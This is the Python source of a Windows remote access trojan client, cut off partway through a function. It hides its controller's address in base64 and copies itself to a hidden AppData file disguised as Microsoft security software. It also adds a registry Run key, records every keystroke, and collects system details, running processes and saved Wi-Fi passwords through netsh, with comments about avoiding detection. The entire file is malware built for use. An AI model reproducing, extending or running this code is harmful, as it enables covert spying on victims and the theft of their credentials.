import socket
import subprocess
import os
import threading
import time
import ctypes
from PIL import ImageGrab
import getpass
from datetime import datetime
import base64
import traceback
import sys
import uuid
import winreg
import json
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import hashlib
import pynput.keyboard

# --- Configuration ---
# Obfuscated connection details
ENCODED_HOST = "MTkyLjE2OC4xLjEzOQ==" # CHANGE THIS: Your IP
ENCODED_PORT = "NDQ0NA==" # CHANGE THIS: Your Port
# A random key for AES encryption. Must be 16, 24, or 32 bytes long.
# In a real scenario, this would be harder to find.
AES_KEY = b'thisisasecretkey1234567890123456' 
# Mutex name to prevent multiple instances
MUTEX_NAME = "Global\\{E5A3B2C1-8F9D-4E5A-A1B2-C3D4E5F6A7B8}"

# --- Stealth & Persistence ---

def is_admin():
    """Check if the script is running with administrative privileges."""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def add_to_registry():
    """Add the script to the registry for persistence."""
    if not is_admin():
        # Silently fail if not admin, as we can't write to HKLM
        return
    
    try:
        # Get the path of the current executable
        exe_path = sys.executable
        key = winreg.HKEY_LOCAL_MACHINE
        sub_key = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
        
        # Create a new registry key
        with winreg.OpenKey(key, sub_key, 0, winreg.KEY_WRITE) as reg_key:
            # Use a legitimate-sounding name for the registry entry
            winreg.SetValueEx(reg_key, "Windows Security Essentials", 0, winreg.REG_SZ, exe_path)
    except Exception as e:
        log_error("Registry Persistence Failed", e)

def setup_persistence():
    """Copies the script to a hidden location and sets up persistence."""
    try:
        # Determine if running as a script or a frozen exe
        if getattr(sys, 'frozen', False):
            source_path = sys.executable
            dest_dir = os.path.join(os.getenv('APPDATA'), "Microsoft", "Security")
            dest_name = "msseces.exe"
        else:
            source_path = __file__
            dest_dir = os.path.join(os.getenv('APPDATA'), "Python", "Services")
            dest_name = "python_service.exe"
        
        dest_path = os.path.join(dest_dir, dest_name)
        
        if not os.path.exists(dest_dir):
            os.makedirs(dest_dir, exist_ok=True)
        
        # Copy the file if it's not already there
        if source_path != dest_path:
            import shutil
            shutil.copyfile(source_path, dest_path)
            # Hide the file
            ctypes.windll.kernel32.SetFileAttributesW(dest_path, 2) # FILE_ATTRIBUTE_HIDDEN
        
        # Attempt to add to registry
        add_to_registry()

    except Exception as e:
        log_error("Persistence Setup Failed", e)

def check_mutex():
    """Ensures only one instance of the script is running."""
    try:
        mutex = ctypes.windll.kernel32.CreateMutexW(None, True, MUTEX_NAME)
        if ctypes.windll.kernel32.GetLastError() == 0xB7: # ERROR_ALREADY_EXISTS
            os._exit(0) # Exit silently
    except Exception as e:
        log_error("Mutex Check Failed", e)
        os._exit(1)

# --- Cryptography ---

def derive_key(password: str, salt: bytes, key_length: int = 32):
    """Derive a cryptographic key from a password."""
    return hashlib.pbkdf2_hmac('sha256', password.encode('utf-8'), salt, 100000, dklen=key_length)

def encrypt_data(data: bytes, key: bytes):
    """Encrypt data using AES-CBC."""
    iv = os.urandom(16)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    ct_bytes = cipher.encrypt(pad(data, AES.block_size))
    return base64.b64encode(iv + ct_bytes)

def decrypt_data(enc_data: b64_bytes, key: bytes):
    """Decrypt data using AES-CBC."""
    enc_data = base64.b64decode(enc_data)
    iv = enc_data[:16]
    ct = enc_data[16:]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    pt_bytes = unpad(cipher.decrypt(ct), AES.block_size)
    return pt_bytes

# --- Keylogger ---

LOG_FILE_KEYS = os.path.join(os.getenv("TEMP"), "key_log.txt")

def on_press(key):
    """Callback for keypress events."""
    try:
        with open(LOG_FILE_KEYS, "a") as f:
            f.write(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - {key.char}\n")
    except AttributeError:
        with open(LOG_FILE_KEYS, "a") as f:
            f.write(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - {str(key)}\n")

def start_keylogger():
    """Starts the keylogger in a separate thread."""
    try:
        listener = pynput.keyboard.Listener(on_press=on_press)
        listener.start()
    except Exception as e:
        log_error("Keylogger Failed to Start", e)

# --- Error Logging & GUI ---
LOG_FILE = "client_log.txt"

def log_error(error_title, exception_object):
    """Logs an exception's details to a file."""
    try:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open(LOG_FILE, "a") as f:
            f.write(f"\n--- ERROR LOG: [{timestamp}] ---\n")
            f.write(f"TITLE: {error_title}\n")
            f.write("TRACEBACK:\n")
            f.write(traceback.format_exc())
            f.write("-------------------------------------\n\n")
    except Exception as e:
        pass # Silently fail to avoid detection

def show_error(title, message):
    """Displays a Windows error message box."""
    try:
        ctypes.windll.user32.MessageBoxW(0, message, title, 0x10)
    except:
        pass

# --- Core Commands ---

def get_system_info():
    """Gathers detailed system information."""
    info = {
        "user": getpass.getuser(),
        "hostname": socket.gethostname(),
        "os": f"{os.name}",
        "cwd": os.getcwd(),
        "privileges": "Admin" if is_admin() else "User",
        "public_ip": "N/A" # Could be fetched via a request to an API
    }
    
    # Get running processes
    try:
        result = subprocess.run(['tasklist'], capture_output=True, text=True, check=True)
        info['processes'] = result.stdout
    except Exception as e:
        info['processes'] = f"Error: {str(e)}"

    # Get Wi-Fi passwords
    try:
        wifi_profiles = subprocess.check_output('netsh wlan show profiles', shell=True).decode('utf-8', errors="ignore").split('\n')
        wifi_data = []
        for profile in wifi_profiles:
            if "All User Profile" in profile:
                profile_name = profile.split(":")[1].strip()
                try:
                    profile_info = subprocess.check_output(f'netsh wlan show profile name="{profile_name}" key=clear', shell=True).decode('utf-8', errors="ignore")
                    wifi_data.append(profile_info)
                except:
                    continue
        info['wifi_passwords'] = "\n".join(wifi_data)
    except Exception as e:
        info['wifi_passwords']